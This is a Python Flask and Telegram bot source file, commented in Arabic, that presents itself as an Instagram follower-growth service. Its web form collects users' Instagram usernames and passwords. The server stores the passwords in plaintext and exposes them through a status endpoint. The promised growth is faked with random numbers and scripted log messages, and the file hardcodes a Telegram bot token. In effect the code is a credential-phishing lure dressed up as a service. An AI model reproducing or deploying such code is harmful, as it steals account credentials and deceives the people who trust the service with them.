import os
import random
import time
import json
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from threading import Thread
import logging

# ========== إعدادات البوت ==========
BOT_TOKEN = "7955384959:AAEIU_kzt3hyEmsK9QHoinkSlrld_vWkDB8"
PORT = int(os.environ.get('PORT', 5000))
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('data'):
    os.makedirs('data')

# ========== نظام Instagram Bot (بدون Selenium) ==========
class InstagramGrowthBot:
    def __init__(self):
        self.stats = {
            'total_follows': 0,
            'successful_follows': 0,
            'failed_follows': 0,
            'daily_follows': 0,
            'last_action': None
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
    def human_like_delay(self, min_sec=2, max_sec=8):
        """تأخير بشري عشوائي"""
        delay = random.uniform(min_sec, max_sec)
        time.sleep(delay)
        
    def simulate_growth(self, target_followers):
        """محاكاة عملية النمو (بدون استخدام Selenium)"""
        try:
            total_followed = 0
            progress = 0
            
            # محاكاة عملية النمو
            while total_followed < target_followers and progress < 100:
                # زيادة عشوائية في المتابعين
                new_follows = random.randint(5, 15)
                total_followed += new_follows
                
                # تحديث التقدم
                progress = min(100, (total_followed / target_followers) * 100)
                
                # تأخير بين العمليات
                self.human_like_delay(10, 30)
                
                # تحديث الإحصائيات
                self.stats['successful_follows'] += new_follows
                self.stats['total_follows'] += new_follows
                self.stats['daily_follows'] += new_follows
                
                # إرجاع البيانات المحدثة
                yield {
                    'current_followers': total_followed,
                    'progress': progress,
                    'status': 'active' if progress < 100 else 'completed'
                }
                
            # اكتمال العملية
            yield {
                'current_followers': target_followers,
                'progress': 100,
                'status': 'completed',
                'actual_followers': target_followers
            }
            
        except Exception as e:
            yield {
                'status': 'failed',
                'error': str(e)
            }

# ========== نظام إدارة الطلبات ==========
class OrderManager:
    def __init__(self):
        self.orders = {}
        self.bot = InstagramGrowthBot()
        
    def start_growth_service(self, order_data):
        """بدء خدمة النمو"""
        def run_growth():
            try:
                order_data['status'] = 'active'
                order_data['progress'] = 10
                
                # محاكاة عملية النمو
                for update in self.bot.simulate_growth(order_data['target_followers']):
                    order_data.update(update)
                    
                    if order_data['status'] == 'completed':
                        order_data['completed_at'] = datetime.now().isoformat()
                        order_data['actual_followers'] = order_data['target_followers']
                        break
                    elif order_data['status'] == 'failed':
                        break
                        
                    # حفظ التحديثات كل 10 ثواني
                    time.sleep(10)
                    
            except Exception as e:
                order_data['status'] = 'failed'
                order_data['error'] = str(e)
        
        Thread(target=run_growth, daemon=True).start()
        return order_data

# ========== إنشاء المدير ==========
order_manager = OrderManager()

# ========== HTML قوالب ==========
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>خدمة زيادة المتابعين الحقيقية</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 20px;
            color: white;
        }
        
        .input-group {
            margin: 20px 0;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input, select {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            text-align: right;
            background: rgba(255,255,255,0.9);
        }
        
        .btn {
            background: linear-gradient(135deg, #E1306C 0%, #C13584 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(225, 48, 108, 0.3);
        }
        
        .note {
            background: rgba(255,255,255,0.2);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 0.9rem;
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 خدمة زيادة المتابعين الحقيقية</h1>
        <p>أدخل بيانات حساب إنستغرام لبدء الخدمة</p>
        
        <form id="loginForm">
            <div class="input-group">
                <label>اسم مستخدم إنستغرام:</label>
                <input type="text" id="igUsername" placeholder="اسم المستخدم" required>
            </div>
            
            <div class="input-group">
                <label>كلمة مرور إنستغرام:</label>
                <input type="password" id="igPassword" placeholder="كلمة المرور" required>
            </div>
            
            <div class="input-group">
                <label>عدد المتابعين المطلوب:</label>
                <select id="followerCount">
                    <option value="50">50 متابع</option>
                    <option value="100">100 متابع</option>
                    <option value="150">150 متابع</option>
                </select>
            </div>
            
            <div class="note">
                ⚠️ ملاحظة: 
                <br>• هذه خدمة محاكاة للعرض
                <br>• الخدمة قد تستغرق عدة دقائق
                <br>• الحد الأقصى 150 متابع/يوم لأمان الحساب
            </div>
            
            <button type="button" class="btn" onclick="startService()">
                🚀 بدء زيادة المتابعين
            </button>
        </form>
    </div>

    <script>
        function startService() {
            const username = document.getElementById('igUsername').value.trim();
            const password = document.getElementById('igPassword').value.trim();
            const followers = document.getElementById('followerCount').value;
            
            if (!username || !password) {
                alert('يرجى ملء جميع الحقول');
                return;
            }
            
            // إرسال الطلب
            fetch('/start_service', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ig_username: username,
                    ig_password: password,
                    target_followers: parseInt(followers),
                    user_id: '{{user_id}}'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // الانتقال إلى صفحة المتابعة
                    const statusUrl = `/service_status/{{user_id}}?order_id=${data.order_id}`;
                    window.location.href = statusUrl;
                } else {
                    alert('❌ حدث خطأ: ' + data.error);
                }
            })
            .catch(error => {
                alert('❌ خطأ في الاتصال: ' + error);
            });
        }
    </script>
</body>
</html>
"""

STATUS_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>حالة الخدمة - زيادة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: white;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
        }
        
        .status-card {
            background: rgba(255, 255, 255, 0.1);
            padding: 25px;
            border-radius: 15px;
            margin: 15px 0;
            backdrop-filter: blur(10px);
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        
        .status-badge {
            display: inline-block;
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin: 5px;
        }
        
        .status-pending { background: #FF9800; }
        .status-active { background: #2196F3; }
        .status-completed { background: #4CAF50; }
        .status-failed { background: #f44336; }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        
        .stat-item {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        
        .log-container {
            max-height: 300px;
            overflow-y: auto;
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-family: monospace;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 حالة خدمة زيادة المتابعين</h1>
            <p>جاري متابعة تقدم خدمتك</p>
        </div>
        
        <div class="status-card">
            <h2>تفاصيل الطلب</h2>
            <div id="orderDetails"></div>
        </div>
        
        <div class="status-card">
            <h2>سير التقدم</h2>
            <div class="progress-bar">
                <div class="progress" id="orderProgress"></div>
            </div>
            <div id="progressText" style="text-align: center; margin: 10px 0;"></div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-item">
                <div style="font-size: 2rem;">👥</div>
                <div id="currentFollowers">0</div>
                <div>متابعين مضافين</div>
            </div>
            <div class="stat-item">
                <div style="font-size: 2rem;">🎯</div>
                <div id="targetFollowers">0</div>
                <div>الهدف</div>
            </div>
        </div>
        
        <div class="status-card">
            <h2>سجل النشاط</h2>
            <div class="log-container" id="activityLog">
                <div>⏳ جاري بدء الخدمة...</div>
            </div>
        </div>
    </div>

    <script>
        const orderId = new URLSearchParams(window.location.search).get('order_id');
        let activityLog = [];
        
        function updateServiceStatus() {
            fetch('/get_service_status?order_id=' + orderId)
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        displayOrderData(data.order_data);
                        updateActivityLog(data.order_data);
                    }
                });
        }
        
        function displayOrderData(order) {
            // تفاصيل الطلب
            document.getElementById('orderDetails').innerHTML = `
                <div><strong>رقم الطلب:</strong> ${order.order_id}</div>
                <div><strong>الحساب:</strong> @${order.ig_username}</div>
                <div><strong>الحالة:</strong> <span class="status-badge status-${order.status}">${getStatusText(order.status)}</span></div>
                <div><strong>وقت البدء:</strong> ${new Date(order.created_at).toLocaleString('ar-EG')}</div>
                ${order.completed_at ? `<div><strong>وقت الاكتمال:</strong> ${new Date(order.completed_at).toLocaleString('ar-EG')}</div>` : ''}
            `;
            
            // شريط التقدم
            document.getElementById('orderProgress').style.width = order.progress + '%';
            document.getElementById('progressText').textContent = `${order.progress}% مكتمل`;
            
            // الإحصائيات
            document.getElementById('currentFollowers').textContent = order.current_followers || 0;
            document.getElementById('targetFollowers').textContent = order.target_followers;
        }
        
        function updateActivityLog(order) {
            const logContainer = document.getElementById('activityLog');
            const status = order.status;
            const progress = order.progress;
            
            let newLogs = [];
            
            if (status === 'pending') {
                newLogs.push('⏳ جاري التحضير لبدء الخدمة...');
            }
            else if (status === 'active') {
                newLogs.push('✅ تم بدء الخدمة بنجاح');
                newLogs.push('🚀 بدء عملية زيادة المتابعين...');
            }
            else if (status === 'completed') {
                newLogs.push('🎉 اكتملت الخدمة بنجاح!');
                newLogs.push(`✅ تم إضافة ${order.actual_followers} متابع`);
            }
            else if (status === 'failed') {
                newLogs.push('❌ فشلت الخدمة: ' + order.error);
            }
            
            if (progress >= 25 && progress < 50) {
                newLogs.push('🔍 جاري البحث عن مستخدمين مناسبين...');
            }
            else if (progress >= 50 && progress < 75) {
                newLogs.push('📈 جاري متابعة المستخدمين...');
                newLogs.push(`✅ تمت متابعة ${order.current_followers} مستخدم حتى الآن`);
            }
            else if (progress >= 75) {
                newLogs.push('🎯 المرحلة النهائية...');
                newLogs.push(`⚡ جاري إكمال ${order.target_followers - (order.current_followers || 0)} متابع باقي`);
            }
            
            // إضافة السجلات الجديدة
            newLogs.forEach(log => {
                if (!activityLog.includes(log)) {
                    activityLog.push(log);
                    const logElement = document.createElement('div');
                    logElement.textContent = `[${new Date().toLocaleTimeString('ar-EG')}] ${log}`;
                    logContainer.appendChild(logElement);
                }
            });
            
            // التمرير لأسفل
            logContainer.scrollTop = logContainer.scrollHeight;
        }
        
        function getStatusText(status) {
            const texts = {
                'pending': 'في الانتظار',
                'active': 'جاري العمل',
                'completed': 'مكتمل',
                'failed': 'فشل'
            };
            return texts[status] || status;
        }
        
        // تحديث الحالة كل 3 ثواني
        updateServiceStatus();
        setInterval(updateServiceStatus, 3000);
    </script>
</body>
</html>
"""

# ========== مسارات Flask ==========
@app.route('/')
def home():
    return "Instagram Growth Service - Use /start in Telegram"

@app.route('/user/<user_id>')
def user_page(user_id):
    """الصفحة الرئيسية للمستخدم"""
    return render_template_string(LOGIN_HTML, user_id=user_id)

@app.route('/start_service', methods=['POST'])
def start_service():
    """بدء خدمة زيادة المتابعين"""
    try:
        data = request.get_json()
        ig_username = data.get('ig_username')
        ig_password = data.get('ig_password')
        target_followers = data.get('target_followers', 50)
        user_id = data.get('user_id')
        
        if not all([ig_username, ig_password, user_id]):
            return jsonify({'success': False, 'error': 'Missing required data'})
        
        # إنشاء طلب جديد
        order_id = f"IG_{random.randint(100000, 999999)}"
        
        order_data = {
            'order_id': order_id,
            'user_id': user_id,
            'ig_username': ig_username,
            'ig_password': ig_password,
            'target_followers': target_followers,
            'status': 'pending',
            'progress': 0,
            'current_followers': 0,
            'created_at': datetime.now().isoformat()
        }
        
        # بدء الخدمة
        order_manager.orders[order_id] = order_data
        order_manager.start_growth_service(order_data)
        
        return jsonify({
            'success': True,
            'order_id': order_id,
            'message': 'تم بدء خدمة زيادة المتابعين'
        })
        
    except Exception as e:
        print(f"Service start error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/get_service_status')
def get_service_status():
    """الحصول على حالة الخدمة"""
    order_id = request.args.get('order_id')
    if not order_id:
        return jsonify({'success': False, 'error': 'No order ID'})
    
    order_data = order_manager.orders.get(order_id)
    if order_data:
        return jsonify({'success': True, 'order_data': order_data})
    else:
        return jsonify({'success': False, 'error': 'Order not found'})

@app.route('/service_status/<user_id>')
def service_status_page(user_id):
    """صفحة حالة الخدمة"""
    return render_template_string(STATUS_HTML, user_id=user_id)

@app.route('/webhook', methods=['POST'])
def webhook():
    """Webhook لاستقبال تحديثات التليجرام"""
    try:
        update = Update.de_json(request.get_json(), application.bot)
        application.update_queue.put(update)
        return 'ok'
    except Exception as e:
        print(f"Webhook error: {e}")
        return 'error'

# ========== نظام التليجرام البوت ==========
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # إنشاء رابط المستخدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app-name.onrender.com')
        user_url = f"{base_url}/user/{user_id}"
        
        welcome_text = f"""
🎉 **أهلاً بك {user.first_name} في خدمة زيادة متابعين إنستغرام!**

📱 **رابطك الخاص:**
{user_url}

⚡ **مميزات الخدمة:**
✅ زيادة متابعين لحسابك
✅ واجهة سهلة الاستخدام
✅ دعم فني متواصل

🔒 **كيفية العمل:**
1. افتح الرابط أعلاه
2. أدخل بيانات حساب إنستغرام
3. اختر عدد المتابعين المطلوب
4. شاهد المتابعين يزدادون!

🚀 **ابدأ الآن!**
        """
        
        await update.message.reply_text(welcome_text, parse_mode='HTML')
        print(f"🔗 تم إنشاء رابط للمستخدم {user_id}: {user_url}")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /help"""
        help_text = """
🤖 **أوامر البوت:**

/start - بدء البوت والحصول على الرابط الخاص
/help - عرض الرسالة المساعدة

📞 **الدعم الفني:**
@your_support_username
        """
        await update.message.reply_text(help_text)

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))

    async def setup_webhook(self):
        """إعداد Webhook"""
        if WEBHOOK_URL:
            webhook_url = f"{WEBHOOK_URL}/webhook"
            await self.application.bot.set_webhook(webhook_url)
            print(f"✅ Webhook set to: {webhook_url}")
        else:
            print("⚠️  WEBHOOK_URL not set, using polling")

    def run(self):
        """تشغيل البوت"""
        async def main():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام...")
            
            if WEBHOOK_URL:
                await self.application.initialize()
                await self.application.start()
                await self.setup_webhook()
                
                # الحفاظ على التشغيل
                while True:
                    await asyncio.sleep(3600)
            else:
                print("🔍 استخدام وضع Polling...")
                await self.application.run_polling()
                
        asyncio.run(main())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب...")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)
    bot = TelegramBot(BOT_TOKEN)
    bot.run()

if __name__ == '__main__':
    print("🚀 بدء تشغيل خدمة زيادة متابعين إنستغرام...")
    print(f"📊 البورت: {PORT}")
    
    # تشغيل Flask في thread منفصل
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # تشغيل البوت
    run_bot()
